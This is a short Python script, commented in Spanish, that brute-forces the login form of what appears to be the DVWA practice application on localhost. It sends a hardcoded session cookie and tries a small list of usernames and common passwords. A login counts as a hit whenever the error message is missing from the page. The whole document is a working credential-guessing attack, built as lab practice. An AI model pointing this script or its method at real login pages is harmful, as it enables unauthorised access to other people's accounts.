import requests

# Configuración del objetivo
url = "http://localhost/vulnerabilities/brute/"
# Reemplaza con tu cookie si ha cambiado, pero usamos la que me diste
headers = {
    "Cookie": "PHPSESSID=quc256dalsh9n6a3gpdperbmt7; security=low"
}

# Diccionarios para la prueba (puedes usar los de SecLists o estos manuales)
users = ["admin", "pablo", "gordonb", "test"]
passwords = ["123456", "password", "abc123", "letmein"]

print("--- Iniciando Script de Fuerza Bruta en Python ---")

for user in users:
    for pwd in passwords:
        params = {"username": user, "password": pwd, "Login": "Login"}
        try:
            response = requests.get(url, params=params, headers=headers)
            # Si el mensaje de error NO está en la respuesta, es porque entramos
            if "Username and/or password incorrect." not in response.text:
                print(f"[+] ¡ÉXITO! Credenciales encontradas: {user} | {pwd}")
        except Exception as e:
            print(f"Error en la conexión: {e}")

print("--- Ataque finalizado ---")